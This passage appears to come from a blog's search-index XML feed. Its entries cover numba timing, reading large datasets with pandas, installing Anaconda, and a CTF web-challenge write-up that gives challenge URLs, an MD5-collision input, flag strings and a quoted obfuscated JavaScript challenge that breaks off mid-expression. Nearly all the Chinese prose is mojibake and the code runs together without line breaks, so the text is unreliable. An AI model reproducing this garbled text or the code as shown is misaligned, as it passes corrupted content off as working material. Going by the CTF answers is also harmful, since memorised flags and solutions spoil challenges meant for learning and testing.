x + y + 99 # in any case, this redundant code seems to z = z * ( z - .88 ) # have something to do with the code running # faster. without the redundant code, the zz[j] = z # numba and numpy functions are exactly the same. return zzx = np.random.randn(nobs)y = np.random.randn(nobs)z = np.zeros(nobs)res_numpy = proc_numpy(x,y,z)z = np.zeros(nobs)res_numba = proc_numba(x,y,z)%timeit proc_numpy(x,y,z)%timeit proc_numba(x,y,z) ç»“æžœå¦‚å›¾,ç¬¬ä¸€è¡Œæ˜¯ç”¨cpuè®¡ç®—çš„æ—¶é—´ï¼Œ2.06msï¼›ç¬¬äºŒè¡Œæ˜¯gpuè®¡ç®—çš„æ—¶é—´ 121Î¼sï¼›å°±æœ¬ä¾‹è€Œè¨€å¿«äº†17å€å·¦å³ã€‚]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[æ•°æ®æŒ–æŽ˜æ¯”èµ›ï¼ˆ2ï¼‰åˆ©ç”¨pandasè¯»å–å¤§åž‹æ•°æ®é›†]]></title>
      <url>%2F2017%2F01%2F25%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%882%EF%BC%89%E5%88%A9%E7%94%A8pandas%E8%AF%BB%E5%8F%96%E5%A4%A7%E5%9E%8B%E6%95%B0%E6%8D%AE%E9%9B%86%2F</url>
      <content type="text"><![CDATA[æ•°æ®æ¯”èµ›ä¸­ï¼Œæœ‰æ—¶æä¾›çš„æ•°æ®é›†ä¼šå¾ˆå¤§ï¼Œå¸¸è§„æ–¹æ³•æ‰“ä¸å¼€ï¼Œè¿™æ—¶å€™å°±éœ€è¦åœ¨è¯»å…¥æ—¶åšäº›å°å¤„ç†ï¼Œæ–¹ä¾¿åŽç»­æ“ä½œã€‚ è¯»å…¥ä»¥IJCAI-17æ¯”èµ›æ•°æ®é›†ä¸­çš„user_pay.txt å’Œ user_view.txt ä¸ºä¾‹ï¼Œuser_pay.txtæœ‰ 2.13Gb ä¹‹å¤§ï¼Œè€Œuser_view.txt åªæœ‰ 174Mb ã€‚ä¸¤è€…çš„è¯»å…¥æ–¹æ³•è§ä¸‹ã€‚ å¯¹äºŽ user_view.txt è¿™ç§è¾ƒå°åž‹çš„æ•°æ® ï¼Œç›´æŽ¥è¯»å…¥å³å¯ã€‚å¦‚ä¸‹ï¼š123import pandas as pduser_view_db = pd.read_table('user_view.txt',header=None,sep=',')user_view_db.head() ä½†å¯¹äºŽå¦‚ 2.13Gbå¤§çš„ user_pay.txt çš„å¤§åž‹æ•°æ®ï¼Œå¦‚æžœç›´æŽ¥è¯»å…¥ï¼Œä¼šè®©ç¡¬ç›˜å’Œå†…å­˜é£™æ»¡ä¸”é€Ÿåº¦éžå¸¸æ…¢ï¼ˆæœºå­å¥½çš„ç«¥éž‹è¯·å¿½ç•¥â€”ï¼‰ã€‚å¯¹æ­¤ï¼Œé‡‡å–çš„ç­–ç•¥æ˜¯åˆ†å—è¯»å…¥ã€‚åœ¨ç”¨ read_table è¯»å…¥æ—¶æŒ‡å®š chunksize å‚æ•°å’Œ iteratorå‚æ•°ï¼Œå¦‚ä¸‹ï¼š1user_pay_db = pd.read_table('user_pay.txt',header=None,sep=',',iterator=True,chunksize=10000) (æ³¨ï¼šchunksizeç­‰äºŽå¤šå°‘å¯ä»¥è‡ªå·±é€‰å®šï¼Œiterator=Trueå¥½åƒä¸€èˆ¬éƒ½è¿™ä¹ˆè®¾å®šï¼šï¼‰è‡³äºŽwhyåœ¨stackoverflowä¸Šæœ‰ç›¸å…³é—®é¢˜ä½†ä¼¼ä¹Žæ²¡æœ‰æ»¡æ„çš„ç­”æ¡ˆ) å¯ä»¥çœ‹åˆ°å¤šäº†ä¸¤ä¸ªå‚æ•°åŽï¼Œuser_pay_db ä¸å†æ˜¯dataframeäº†ï¼Œè€Œæ˜¯pandas.io.parsers.TextFileReaderã€‚æƒ³è¦æŸ¥çœ‹å®ƒå¯ä»¥å¦‚ä¸‹ï¼š12for chunk in user_pay_db: print(chunk) å®ƒä¼šæŒ‰ç…§ chunksize çš„å¤§å°æ‰“å°å‡ºå†…å®¹ï¼Œå¦‚ä¸‹: ï¼ˆç”±äºŽæ•°æ®é›†è¿‡å¤§ï¼Œåªæˆªå–éƒ¨åˆ†å†…å®¹ï¼‰ å¤„ç†æŽ¥ä¸‹æ¥çš„å¤„ç†æœ‰ä¸¤ç§ï¼Œä¸€æ˜¯å¯ä»¥ç›´æŽ¥å¯¹ user_pay_db ä¸­çš„æ¯ä¸ª chunk è¿›è¡Œåˆ†å—å¤„ç†ï¼Œä¹Ÿå¯ä»¥æƒ³åŠžæ³•æŠŠ æ­¤æ—¶ä¸ºTextFileReaderçš„ user_pay_db è½¬åŒ–ä¸ºæ˜“äºŽæ“ä½œçš„ dataframeæ ¼å¼ã€‚è¿™é‡Œåªæ¼”ç¤ºç¬¬äºŒç§æ–¹æ³•ã€‚ æˆ‘ä»¬å¯ä»¥å€ŸåŠ© pandas ä¸­çš„concatæ–¹æ³•æ¥åˆå¹¶æ•°æ®é›†ã€‚å¦‚ä¸‹ï¼š1df = pd.concat([chunk for chunk in user_pay_db],ignore_index=True) è¿™é‡Œç”¨å˜é‡dfæ¥å­˜å‚¨ã€‚æˆ‘ä»¬ç»™concatä¼ äº†ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯åˆ©ç”¨äº†forå¾ªçŽ¯ï¼Œæ³¨æ„ä¸è¦å¿½ç•¥äº†ä¸­æ‹¬å·ï¼›ç¬¬äºŒä¸ªå‚æ•°ç”¨äºŽå‘Šè¯‰concatè¿žæŽ¥æ—¶å¿½ç•¥æŽ‰æ¯ä¸ªchunkä¸­åŽŸæœ‰çš„indexï¼Œå¦åˆ™ç­‰è¿žæŽ¥å®ŒåŽï¼Œä¼šå‡ºçŽ°åŒä¸€ä¸ªindexå¯¹åº”äº†å¤šä¸ªé¡¹çš„æƒ…å†µï¼Œå¦‚ä¸‹ï¼š å°ç»“ï¼ˆé¢˜å¤–è¯ï¼‰ä¸Šé¢çš„ä»£ç æ˜¯åŸºäºŽ Anaconda 4.2.0 (64-bit)é›†æˆåŒ…çš„ã€‚å…¶pandasç‰ˆæœ¬ä¸º0.18.1ï¼Œè€Œæœ€æ–°çš„pandasç‰ˆæœ¬ä¸º0.19ï¼Œå…¶ä¸­çš„ä¸€äº›å‡½æ•°çš„ä½¿ç”¨æ–¹æ³•åšäº†æ›´æ–°ï¼Œæ¯”å¦‚concatã€‚å¸Œæœ›è¯»è€…åœ¨ä¸Šè¿°ä»£ç è¿è¡Œä¸äº†ä¸å¯¹çš„æƒ…å†µä¸‹èƒ½æŸ¥æŸ¥æ–‡æ¡£ç•™ç•™è¨€ä¸€èµ·è®¨è®ºï¼šï¼‰ ä¸‹é¢é™„ä¸Špandasçš„æ–‡æ¡£åœ°å€ pandas 0.18.1 æ–‡æ¡£ pandas 0.19.2 æ–‡æ¡£ ä¸æ¸…æ¥šè‡ªå·±pandasç‰ˆæœ¬çš„ï¼Œè§ä¸‹,å…¶ä¸­versionå‰åŽéƒ½æ˜¯ä¸¤ä¸ªä¸‹åˆ’çº¿__ï¼š æ¬¢è¿Žç•™è¨€ï¼šï¼‰]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[æ•°æ®æŒ–æŽ˜æ¯”èµ›ï¼ˆ1ï¼‰å¯¹æ— åˆ—åçš„txtæ•°æ®é›†è¯»å–æ–¹æ³•åŠå¤„ç†]]></title>
      <url>%2F2017%2F01%2F24%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%881%EF%BC%89%E5%AF%B9%E6%97%A0%E5%88%97%E5%90%8D%E7%9A%84txt%E6%95%B0%E6%8D%AE%E9%9B%86%E8%AF%BB%E5%8F%96%E6%96%B9%E6%B3%95%E5%8F%8A%E5%A4%84%E7%90%86%2F</url>
      <content type="text"><![CDATA[æŽ¥è§¦å¤§æ•°æ®æ¯”èµ›ï¼Œå¿…ç„¶è¦æŽ¥è§¦å¤§æ•°æ®ï¼ˆ&lt;â€”å¥½å§åºŸè¯ï¼‰æ‰€ä»¥ç¬¬ä¸€é“é—¨æ§›æ˜¯å¦‚ä½•è¯»å–å¤§æ•°æ®æ–‡ä»¶ã€‚æœ‰æ—¶æ¯”èµ›æä¾›çš„datasetæ˜¯å¸¦æœ‰æ ‡ç­¾çš„csvæ ¼å¼æ–‡ä»¶ï¼Œæœ‰æ—¶ä¹Ÿä¼šæä¾›ä¸å¸¦æ ‡ç­¾çš„æ™®é€štxtæ–‡ä»¶ï¼Œæ­¤æ–‡ä¸»è¦å†™å†™å¯¹è¯»å–æ­¤ç§txtæ–‡ä»¶çš„ä¸€äº›å°æ–¹æ³•å’Œå¤„ç†ã€‚ åŸºæœ¬çš„è¯»å…¥å…¶å®žpythoné‡Œå·²ç»é›†æˆäº†csvæ¨¡å—äº†ï¼Œä¸è¿‡ä½¿ç”¨èµ·æ¥ä¸é‚£ä¹ˆæ–¹ä¾¿ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œä½¿ç”¨pandasåº“å¯ä»¥æŠŠæ•°æ®è¯»å…¥æˆdataframeå½¢å¼æ–¹ä¾¿æ“ä½œã€‚ è¯»å…¥csvæ–‡ä»¶ä»¥kaggleçš„titanicæ•°æ®é›†ä¸ºä¾‹ç”¨pandasè¯»å…¥çš„ä»£ç å¦‚ä¸‹:12import pandas as pdtitanic_db = pd.read_csv('titanic_train.csv') è¿™æ ·å°±èƒ½æŠŠæ•°æ®é›†è¯»è¿›æ¥äº†ï¼Œå¦‚ä¸‹ï¼šå‡ é“â€™\â€™æ˜¯å¯èƒ½å› ä¸ºå±å¹•å°ï¼ˆï¼Œï¼ŒÔ¾ã…‚Ô¾ï¼Œï¼Œï¼‰è€Œäº§ç”Ÿçš„æ¢è¡Œæç¤ºã€‚æ˜¾ç¤ºå‡ºæ¥çš„æœ‰5è¡Œï¼ˆ0~5ï¼‰ï¼Œæ¯è¡Œçš„ä¸Šé¢éƒ½æœ‰å¯¹åº”çš„åˆ—åã€‚ è¯»å…¥txtæ–‡ä»¶ä»¥IJCAI-17æ¯”èµ›æ•°æ®é›†ä¸­çš„user_view.txtä¸ºä¾‹notepad++æ‰“å¼€å¦‚ä¸‹ï¼šç”¨pandasè¯»å…¥çš„ä»£ç å¦‚ä¸‹:12import pandas as pduser_view = pd.read_table('user_view.txt') æ³¨æ„ä»£ç åº”è¯¥æ˜¯ read_table .ç»“æžœå¦‚ä¸‹å¯ä»¥çœ‹åˆ°è¯»å…¥åŽï¼ŒpandasæŠŠtxtæ–‡ä»¶çš„ç¬¬ä¸€è¡Œå½“åšäº†åˆ—åï¼Œå¾ˆæ˜Žæ˜¾è¿™æ˜¯é”™è¯¯çš„:) è¿™ä¸ªæˆ‘ä»¬ä¸‹é¢æ¥è¿›è¡Œä¿®æ­£ã€‚ é’ˆå¯¹æ— åˆ—åæ–‡ä»¶ç¬¬ä¸€è¡Œçš„è¯»å…¥å¤„ç†ä¸Šé¢æåˆ°çš„ read_csv ã€read_table ç­‰ï¼Œå…¶å®žä»–ä»¬çš„å‚æ•°ä¸ä»…ä»…åªæœ‰ä¸€ä¸ªã€‚ä¸ºäº†è®©æ— åˆ—åçš„æ•°æ®è¯»å…¥æ­£ç¡®ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¯»å…¥çš„æ—¶å€™å¤šæŒ‡å®šä¸€ä¸ªå‚æ•°header=Noneã€‚ä»¥user_view.txtä¸ºä¾‹ã€‚1user_view = pd.read_table('user_view.txt'ï¼Œheader=None) è¯»å…¥ç»“æžœå¦‚ä¸‹ï¼š å¯ä»¥çœ‹åˆ°è¯»å…¥åŽï¼ŒåŽŸtxtæ–‡ä»¶ä¸­çš„ç¬¬ä¸€è¡Œæœ‰äº†Indexï¼ˆå³ 0ï¼‰ï¼Œä¸å†è¢«è¯†åˆ«ä¸ºåˆ—åã€‚ å¯¹txtæ•°æ®é›†è¯»å…¥å¤„ç†ä¸ºæ­£å¸¸çš„dataframeå½¢å¼åœ¨æŒ‡å®šheader=Noneè¯»å…¥txtæ–‡ä»¶åŽï¼Œpandasè‡ªåŠ¨ç»™æ·»äº†ä¸ªåˆ—å 0ï¼Œè¿™è¡¨æ˜Žè¯»å…¥çš„æ¯ä¸€è¡Œå…¶å®žéƒ½æ˜¯è¯»å…¥äº†ä¸€å­—ç¬¦ä¸²ï¼Œæ€»å…±åªæœ‰ 1 åˆ—ï¼å¯¹æ•°æ®çš„æ“ä½œå¾ˆä¸æ–¹ä¾¿ æ‰€ä»¥æˆ‘ä»¬åœ¨é‡åˆ°è¿™ç§æƒ…å†µæ—¶ï¼Œæˆ‘ä»¬è¿˜è¦ç»§ç»­æŒ‡å®šå‚æ•°sepï¼Œå‘Šè¯‰pandasä»¥ä»€ä¹ˆä¸ºåˆ†éš”ç¬¦ã€‚ä»¥user_view.txtä¸ºä¾‹ï¼Œä»Žä¸Šå›¾å¯çŸ¥æ¯è¡Œçš„æ•°æ®æœ‰ä¸‰ä¸ªéƒ¨åˆ†ï¼Œç”¨é€—å·(ï¼Œ)ç›¸éš”å¼€ã€‚æ‰€ä»¥åœ¨è¯»å…¥æ—¶ï¼Œå¦‚ä¸‹ï¼š1user_view = pd.read_table('user_view.txt'ï¼Œheader=Noneï¼Œsep='ï¼Œ') å¯ä»¥å‘çŽ°æ¯åˆ—ï¼ˆ3åˆ—ï¼‰çš„åˆ—åè¢«è®¾ç½®ä¸º 0 1 2ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å¯¹æ•°æ®è¿›è¡Œæ“ä½œã€‚ ç»™æ— åˆ—åçš„æ•°æ®é›†æ·»åŠ åˆ—åæ³•ä¸€ï¼šç›´æŽ¥æ“ä½œå¥½å§ï¼Œè¿™ä¸ªæ–¹æ³•å½“ç„¶æ˜¯æœ€ç®€å•çš„ï¼Œcsvç”¨excelæ‰“å¼€ï¼Œtxtç”¨notepad++ã€sublimeæ‰“å¼€ï¼Œç„¶åŽè‡ªå·±å¡«ä¸Šåˆ—åï¼Œå†æ­£å¸¸è¯»å…¥å°±è¡Œäº†å˜›! åªæ˜¯é€šå¸¸æƒ…å†µä¸‹ï¼Œæ‰€é‡åˆ°çš„æ•°æ®é›†æ¯”è¾ƒå¤§ï¼Œç”¨excelæˆ–è€…notepadç­‰éš¾ä»¥æ‰“å¼€ï¼Œåˆæˆ–è€…æ‰“å¼€åŽä¸å¥½æ“ä½œï¼Œå±€é™æ€§æ¯”è¾ƒå¤§ã€‚åŒæ—¶åœ¨ç›´æŽ¥æ“ä½œæ·»åŠ æ—¶è¿˜è¦è€ƒè™‘åŽŸæ•°æ®é›†çš„æ ¼å¼å’Œç¼–ç ï¼Œæ–¹ä¾¿åŽé¢è¿›ä¸€æ­¥è¯»å…¥ã€‚ æ³•äºŒï¼šåœ¨åˆ©ç”¨pandasè¯»å…¥æ—¶æŒ‡å®šåˆ—åä»¥user_view.txtæ•°æ®é›†ä¸ºä¾‹ï¼Œé˜¿é‡Œå¤©æ± ä¸Šçš„æ•°æ®è¯´æ˜Žæ˜¯ Field Sample Description user_id 0000000001 ç”¨æˆ·id shop_id 000001 å•†å®¶idï¼Œä¸Žshop_infoå¯¹åº” time_stamp 2015-10-10 10:00:00 æµè§ˆæ—¶é—´ æ‰€ä»¥åœ¨è¯»å…¥æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å†æŒ‡å®šä¸€ä¸ªå‚æ•° names .å¯¹ç…§ä¸Šè¿°è¯´æ˜Žå’ŒåŸºäºŽå‰é¢çš„æ“ä½œ()ï¼Œä»£ç å¦‚ä¸‹ï¼š123import pandas as pdcolumns = ['user_id','shop_id','time_stamp']user_view_db = user_view_db = pd.read_table('user_view.txt',header=None,sep=',',names=columns) ç»“æžœå¦‚ä¸‹ï¼š æ³•ä¸‰ï¼šåœ¨ç”¨pandasè¯»å…¥åŽå†åˆ¶å®šåˆ—ååœ¨å®Œæˆå¦‚å‰é¢åŸºæœ¬çš„è¯»å…¥å’Œå¤„ç†åŽï¼Œæ­¤æ—¶ user_view_db åº”è¯¥æ˜¯ åˆ—åä¸º[0,1,2] çš„datframeäº†ã€‚æ­¤æ—¶æˆ‘ä»¬å†é€šè¿‡æŒ‡å®šå…¶å±žæ€§columnsæ¥æŒ‡å®šåˆ—åã€‚1user_view_db.columns=['user_id','shop_id','time_stamp'] å¦‚ä¸‹ï¼š]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[æ•°æ®æŒ–æŽ˜æ¯”èµ›ï¼ˆ0ï¼‰çŽ¯å¢ƒæ­å»ºä¹‹anacondaå®‰è£…]]></title>
      <url>%2F2017%2F01%2F22%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%880%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B9%8Banaconda%E5%AE%89%E8%A3%85%2F</url>
      <content type="text"><![CDATA[æœ€è¿‘å¼€å§‹æŽ¥è§¦ä¸€äº›kaggleçš„æ¯”èµ›ï¼Œéœ€è¦æ­å»ºåŸºæœ¬çš„çŽ¯å¢ƒã€‚åŽŸæœ¬åœ¨æœ¬æœºå’ŒæœåŠ¡å™¨ä¸Šâ€œæ­å¥½äº†â€ï¼Œnumpy.test()ç­‰éƒ½æ²¡æœ‰é—®é¢˜ï¼ŒåŒæ ·çš„ä»£ç å´è¿è¡Œå‡ºäº†ä¸åŒçš„ç»“æžœâ€¦ åŽé¢æŽ¥è§¦åˆ°äº† anacondaè¿™ä¸ªé›†æˆçš„pythonç§‘å­¦è®¡ç®—çŽ¯å¢ƒï¼Œä¸€é”®å¼è§£å†³å¤§éƒ¨åˆ†é—®é¢˜ï¼Œç”šè‡³åœ¨winä¸‹ä¹Ÿèƒ½å®‰è£…ï¼š)è¿™æ ·ä¹ŸçœåŽ»äº†å¼€ä¸€å¤§å †è™šæ‹Ÿæœºçš„éº»çƒ¦ã€‚ ç®€ä»‹ç½‘ä¸Šå„ç§ç®€ä»‹ä¸€å¤§å †ï¼Œå¯¹æˆ‘è€Œè¨€â€¦â€¦scipyåœ¨winä¸‹æ­»æ´»æ²¡è£…ä¸Šï¼Œä¸è¿‡åœ¨ anaconda é‡Œå·²ç»å¾ˆå¥½çš„é›†æˆäº†ï¼Œå—¯ä¸å¤šè¯´äº†ã€‚ ä¸‹è½½æŒ‰ç†æˆ‘ä»¬éƒ½æ˜¯åŽ»å®˜ç½‘ï¼ˆhttps://www.continuum.io/downloadsï¼‰ä¸‹è½½ï¼Œä¸è¿‡ä¸‹è½½é€Ÿåº¦ååˆ†å¯è§‚ï¼Œä¸çŸ¥é“ç¿»å¢™åŽèƒ½ä¸èƒ½å¥½ç‚¹ã€‚æˆ‘çš„æ–¹æ³•æ˜¯åœ¨æµè§ˆå™¨ä¸‹è½½æ—¶å¤åˆ¶å…¶ä¸‹è½½é“¾æŽ¥ï¼Œç„¶åŽæ”¾åˆ°ç™¾åº¦äº‘é‡Œé¢ç¦»çº¿ä¸‹è½½ï¼Œå¯èƒ½ä¼šå‡ºçŽ°é“¾æŽ¥å¤±æ•ˆçš„æƒ…å†µï¼Œä½†å…¶å®žåªè¦ä¸€ç›´ç‚¹ç¦»çº¿ä¸‹è½½ï¼š) ä¸€èˆ¬æœ€åŽä¼šæˆåŠŸçš„ã€‚ä¸‹é¢è¿™ä¸¤ä¸ªæ˜¯æˆ‘åˆšç¦»çº¿å®Œçš„ï¼Œç›®å‰è¿˜æ˜¯æœ€æ–°ç‰ˆï¼Œå„ä½å¦‚æžœéœ€è¦å¯ä»¥ä¿å­˜ä¸€ä¸‹ã€‚ Anaconda3-4.2.0-Windows-x86ï¼š é“¾æŽ¥ï¼šhttp://pan.baidu.com/s/1hsxB3MG å¯†ç ï¼š5k0x Anaconda3-4.2.0-Linux-x86_64.sh é“¾æŽ¥ï¼šhttp://pan.baidu.com/s/1dETp0LN å¯†ç ï¼šxm7x è¿™ä¸¤ä¸ªç‰ˆæœ¬æ˜¯python3ï¼Œ64bitçš„. å¤§å®¶è‡ªå·±çœ‹ç€åŠžï¼š) å®‰è£…winå¹³å°ä¸‹çš„å®‰è£…å¾ˆç®€å•ï¼Œå‚»ç“œå¼æ“ä½œï¼Œä¸­é—´ä¼šæœ‰ä¸¤ä¸ªé€‰é¡¹ç”¨æ¥æŠŠanacondaåŠ å…¥ç³»ç»ŸçŽ¯å¢ƒå˜é‡ï¼Œå®‰è£…åŽç³»ç»ŸçŽ¯å¢ƒå¦‚ä¸‹ï¼š ubuntuä¸‹çš„å®‰è£…ï¼Œåœ¨è™šæ‹Ÿæœºå®‰è£…æ—¶æŒºé¡ºåˆ©çš„ï¼Œä½†åœ¨äº‘æœåŠ¡å™¨ä¸Šé™¤äº†ä¸€ç‚¹å°é—®é¢˜ï¼Œå¯èƒ½è·ŸæœåŠ¡å™¨çš„åˆå§‹çŽ¯å¢ƒæœ‰å…³å§:) è¿è¡Œä¸€ä¸‹shè„šæœ¬ï¼Œè·Ÿç€æç¤ºæ¥ï¼Œæœ€åŽä¸€æ­¥æ˜¯é—®æ˜¯å¦è¦æŠŠanacondaåŠ å…¥ç³»ç»ŸçŽ¯å¢ƒå˜é‡ï¼Œé€‰yesä¸€èˆ¬æ¥è®²åº”è¯¥æ˜¯èƒ½æˆåŠŸçš„ã€‚å¦‚æžœåœ¨æœ€åŽä¸€æ­¥æ—¶æ²¡æœ‰æˆåŠŸæˆ–è€…è¯´è¾“å…¥äº†yesä»¥å¤–çš„å€¼è€Œå¯¼è‡´æ— æ³•é»˜è®¤è¿è¡Œanacondaçš„è¯ï¼Œä¹Ÿå¯ä»¥æŒ‰ç…§å¦‚ä¸‹åšæ³•ï¼ˆä»¥äº‘æœåŠ¡å™¨ä¸Šä¸ºä¾‹ï¼Œè¿™é‡Œæˆ‘é¡ºä¾¿æŠŠæœ€åŸºæœ¬æ“ä½œå†™å‡ºæ¥å§ï¼Œ$è¡¨ç¤ºåœ¨terminalé‡Œçš„æ„æ€â€¦â€¦ï¼‰ï¼š $ vim /home/ubuntu/.bashrc æŒ‰é”®ç›˜å­—æ¯ i ï¼Œ åœ¨æœ€åŽé¢åŠ å…¥ä¸€å¥ï¼š export PATH=/home/ubuntu/anaconda3/bin:$PATH æŒ‰é”®ç›˜ä¸Š ESC ï¼Œå†æŒ‰ ï¼šï¼Œè¾“å…¥ wq é€€å‡ºvim $ source /home/ubuntu/.bashrc å¦‚ä¸‹]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[pwnæ€ç»´å¯¼å›¾]]></title>
      <url>%2F2017%2F01%2F13%2Fpwn%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%2F</url>
      <content type="text"><![CDATA[]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[å—é‚®CTFå¹³å°webå‰30é¢˜è§£]]></title>
      <url>%2F2017%2F01%2F12%2F%E5%8D%97%E9%82%AECTF%E5%B9%B3%E5%8F%B0web%E5%89%8D30%E9%A2%98%E8%A7%A3%2F</url>
      <content type="text"><![CDATA[1ã€æŸ¥çœ‹æºä»£ç view-source:http://chinalover.sinaapp.com/web1/nctf{flag_admiaanaaaaaaaaaaa} 2ã€MD5ç¢°æ’žhttp://115.28.150.176/md5/index.php?a=240610708nctf{md5_collision_is_easy} 3ã€ç»•è¿‡é•¿åº¦é™åˆ¶ï¼Œfirebugä¿®æ”¹é™åˆ¶é•¿åº¦nctf{follow_me_to_exploit} 4ã€ä¸‹è½½è¯¥gifæ–‡ä»¶ï¼Œ010ç¼–è¾‘å™¨æ‰“å¼€ï¼Œ æœ€åŽnctf{photo_can_also_hid3_msg} 5ã€æ‰€è°“å±‚å±‚é€’è¿›ï¼Œå°±æ˜¯ä¸€å±‚ä¸€å±‚çš„æ…¢æ…¢æ‰¾å§view-source:http://chinalover.sinaapp.com/web3/404.html nctf{this_is_a_fl4g} 6ã€ ï¾ŸÏ‰ï¾Ÿï¾‰= /ï½€ï½Â´ï¼‰ï¾‰ ~â”»â”â”» //*Â´âˆ‡ï½€*/ [&#39;_&#39;]; o=(ï¾Ÿï½°ï¾Ÿ) =_=3; c=(ï¾ŸÎ˜ï¾Ÿ) =(ï¾Ÿï½°ï¾Ÿ)-(ï¾Ÿï½°ï¾Ÿ); (ï¾ŸÐ”ï¾Ÿ) =(ï¾ŸÎ˜ï¾Ÿ)= (o^_^o)/ (o^_^o);(ï¾ŸÐ”ï¾Ÿ)={ï¾ŸÎ˜ï¾Ÿ: &#39;_&#39; ,ï¾ŸÏ‰ï¾Ÿï¾‰ : ((ï¾ŸÏ‰ï¾Ÿï¾‰==3) +&#39;_&#39;) [ï¾ŸÎ˜ï¾Ÿ] ,ï¾Ÿï½°ï¾Ÿï¾‰ :(ï¾ŸÏ‰ï¾Ÿï¾‰+ &#39;_&#39;)[o^_^o -(ï¾ŸÎ˜ï¾Ÿ)] ,ï¾ŸÐ”ï¾Ÿï¾‰:((ï¾Ÿï½°ï¾Ÿ==3) +&#39;_&#39;)[ï¾Ÿï½°ï¾Ÿ] }; (ï¾ŸÐ”ï¾Ÿ) [ï¾ŸÎ˜ï¾Ÿ] =((ï¾ŸÏ‰ï¾Ÿï¾‰==3) +&#39;_&#39;) [c^_^o];(ï¾ŸÐ”ï¾Ÿ) [&#39;c&#39;] = ((ï¾ŸÐ”ï¾Ÿ)+&#39;_&#39;) [ (ï¾Ÿï½°ï¾Ÿ)+(ï¾Ÿï½°ï¾Ÿ)-(ï¾ŸÎ˜ï¾Ÿ) ];(ï¾ŸÐ”ï¾Ÿ) [&#39;o&#39;] = ((ï¾ŸÐ”ï¾Ÿ)+&#39;_&#39;) [ï¾ŸÎ˜ï¾Ÿ];(ï¾Ÿoï¾Ÿ)=(ï¾ŸÐ”ï¾Ÿ) [&#39;c&#39;]+(ï¾ŸÐ”ï¾Ÿ) [&#39;o&#39;]+(ï¾ŸÏ‰ï¾Ÿï¾‰ +&#39;_&#39;)[ï¾ŸÎ˜ï¾Ÿ]+ ((ï¾ŸÏ‰ï¾Ÿï¾‰==3) +&#39;_&#39;) [ï¾Ÿï½°ï¾Ÿ] + ((ï¾ŸÐ”ï¾Ÿ) +&#39;_&#39;) [(ï¾Ÿï½°ï¾Ÿ)+(ï¾Ÿï½°ï¾Ÿ)]+ ((ï¾Ÿï½°ï¾Ÿ==3) +&#39;_&#39;) [ï¾ŸÎ˜ï¾Ÿ]+((ï¾Ÿï½°ï¾Ÿ==3) +&#39;_&#39;) [(ï¾Ÿï½°ï¾Ÿ) # (ï¾ŸÎ˜ï¾Ÿ)]+(ï¾ŸÐ”ï¾Ÿ) [&#39;c&#39;]+((ï¾ŸÐ”ï¾Ÿ)+&#39;_&#39;) [(ï¾Ÿï½°ï¾Ÿ)+(ï¾Ÿï½°ï¾Ÿ)]+ (ï¾ŸÐ”ï¾Ÿ) [&#39;o&#39;]+((ï¾Ÿï½°ï¾Ÿ==3) +&#39;_&#39;) [ï¾ŸÎ˜ï¾Ÿ];(ï¾ŸÐ”ï¾Ÿ) [&#39;_&#39;] =(o^_^o) [ï¾Ÿoï¾Ÿ] [ï¾Ÿoï¾Ÿ];(ï¾ŸÎµï¾Ÿ)=((ï¾Ÿï½°ï¾Ÿ==3) +&#39;_&#39;) [ï¾ŸÎ˜ï¾Ÿ]+ (ï¾ŸÐ”ï¾Ÿ) .ï¾ŸÐ”ï¾Ÿï¾‰+((ï¾ŸÐ”ï¾Ÿ)+&#39;_&#39;) [(ï¾Ÿï½°ï¾Ÿ) + (ï¾Ÿï½°ï¾Ÿ)]+((ï¾Ÿï½°ï¾Ÿ==3) +&#39;_&#39;) [o^_^o -ï¾ŸÎ˜ï¾Ÿ]+((ï¾Ÿï½°ï¾Ÿ==3) +&#39;_&#39;) [ï¾ŸÎ˜ï¾Ÿ]+ (ï¾ŸÏ‰ï¾Ÿï¾‰ +&#39;_&#39;) [ï¾ŸÎ˜ï¾Ÿ]; (ï¾Ÿï½°ï¾Ÿ)+=(ï¾ŸÎ˜ï¾Ÿ); (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]=&#39;\\&#39;; (ï¾ŸÐ”ï¾Ÿ).ï¾ŸÎ˜ï¾Ÿï¾‰=(ï¾ŸÐ”ï¾Ÿ+ ï¾Ÿï½°ï¾Ÿ)[o^_^o -(ï¾ŸÎ˜ï¾Ÿ)];(oï¾Ÿï½°ï¾Ÿo)=(ï¾ŸÏ‰ï¾Ÿï¾‰ +&#39;_&#39;)[c^_^o];(ï¾ŸÐ”ï¾Ÿ) [ï¾Ÿoï¾Ÿ]=&#39;\&quot;&#39;;(ï¾ŸÐ”ï¾Ÿ) [&#39;_&#39;] ( (ï¾ŸÐ”ï¾Ÿ) [&#39;_&#39;] (ï¾ŸÎµï¾Ÿ+(ï¾ŸÐ”ï¾Ÿ)[ï¾Ÿoï¾Ÿ]+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸÐ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ 